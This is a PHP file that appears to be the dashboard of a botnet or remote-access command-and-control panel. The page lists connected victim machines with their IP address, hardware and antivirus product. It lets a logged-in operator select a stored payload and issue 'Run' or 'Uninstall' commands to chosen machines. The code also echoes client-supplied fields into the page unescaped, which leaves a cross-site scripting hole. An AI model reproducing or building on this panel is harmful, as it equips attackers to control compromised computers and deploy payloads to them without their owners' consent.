<?php
session_start();

include('./database/db-config.php');
include('./database/db-conn.php');
include('./scripts/getclients.php');
include('./scripts/payloads.php');

if(!isset($_SESSION['user']))
{        
    header('location: ' . "/login.php");
    die();
}

$payloadTable = GetAllPayloads($dbconn);
$onlineClientTable = GetOnlineClients($dbconn);
$clienttable = GetAllClients($dbconn);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include './includes/head.php';?>
</head>

<body>
    <header>
        <?php include './includes/header.php';?>
    </header>
    <main>
        <div class="container">
            <form action="set-command.php" method="post">
                <section class="section">                    
                    <?php 
                        if(isset($_SESSION['command-fail']))
                        {
                            echo("<div class=\"notification is-warning\"> Please select at least 1 client </div>");
                            unset($_SESSION['command-fail']);
                        }
                        if(isset($_SESSION['command-succes']))
                        {
                            echo("<div class=\"notification is-primary\">". $_SESSION['command-succes'] ."</div>");
                            unset($_SESSION['command-succes']);
                        }
                        if(isset($_SESSION['command-error']))
                        {
                            echo("<div class=\"notification is-warning\"> Please select a payload. </div>");
                            unset($_SESSION['command-error']);                            
                        }
                    ?>
                    <!-- Main content -->                    
                    <section class="section">
                        <div class="columns is-gapless">
                            <!-- Command overview -->
                            <div class="column is-2">
                                <div class="select is-rounded">
                                    <select onchange="SelectCommand()" name="command" id="selectcommand">
                                        <option value="" disabled selected> Select command</option>
                                        <option value="run">Run</option>
                                        <option value="uninstall">Uninstall</option>                                        
                                    </select>
                                </div>
                            </div>
                            <!-- Payloads -->
                            <div class="column is-2" id="payloadcollumn">
                                <div class="select is-rounded">
                                    <select name="payload" id="">
                                        <option value="" disabled selected> Select payload</option>
                                        <?php
                                            foreach ($payloadTable as $key => $table) 
                                            {                                    
                                                echo("<option value=\"".$table['Id']."\">".$table['Name']."</option>");
                                            }
                                        ?>
                                    </select>
                                </div>
                            </div>
                            <!-- Submit button -->
                            <div class="column">
                                <button type="submit" class="button is-primary">Submit command</button>
                            </div>
                        </div>
                        <!-- Last seen clients -->
                        <h2 class="title">Clients online in the last 15 minutes</h2>
                        <table class="table is-fullwidth is-striped">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>IP</th>                                    
                                    <th>CPU</th>
                                    <th>RAM</th>
                                    <th>Last online</th>
                                    <th>AV</th>
                                    <th>Current Command</th>
                                    <th>Select</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                foreach ($onlineClientTable as $key => $table) 
                                {                                    
                                    echo("<tr>");
                                    echo("<td>". $table['Id'] ."</td>");
                                    echo("<td>". $table['Ip'] ."</td>");                                    
                                    echo("<td>". $table['CPU'] ."</td>");
                                    echo("<td>". $table['Ram'] ."</td>");
                                    echo("<td>". $table['LastSeen'] ."</td>");
                                    echo("<td>". $table['AntiVirus'] ."</td>");
                                    echo("<td>". "WIP" ."</td>");
                                    echo("<td> <input type=\"checkbox\" name=\"check[]\" value=". $table['Id'] ."> </td>");
                                    echo("</tr>");
                                }
                                ?>
                            </tbody>
                        </table>
                    </section>
                    <br>
                    <section class="section">
                        <h2 class="title">All clients</h2>
                        <table class="table is-fullwidth is-striped">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>IP</th>                                    
                                    <th>CPU</th>
                                    <th>RAM</th>
                                    <th>Last online</th>
                                    <th>AV</th>
                                    <th>Current Command</th>
                                    <th>Select</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                foreach ($clienttable as $key => $table) 
                                {                                    
                                    echo("<tr>");
                                    echo("<td>". $table['Id'] ."</td>");
                                    echo("<td>". $table['Ip'] ."</td>");                                    
                                    echo("<td>". $table['CPU'] ."</td>");
                                    echo("<td>". $table['Ram'] ."</td>");
                                    echo("<td>". $table['LastSeen'] ."</td>");                                    
                                    echo("<td>". $table['AntiVirus'] ."</td>");
                                    echo("<td>". "WIP" ."</td>");
                                    echo("<td> <input type=\"checkbox\" name=\"check[]\" value=". $table['Id'] ."> </td>");
                                    echo("</tr>");
                                }
                                ?>
                            </tbody>
                        </table>
                    </section>
                </section>
            </form>
        </div>
    </main>
    <script type="text/javascript" src="./js/index.js"></script>
</body>

</html>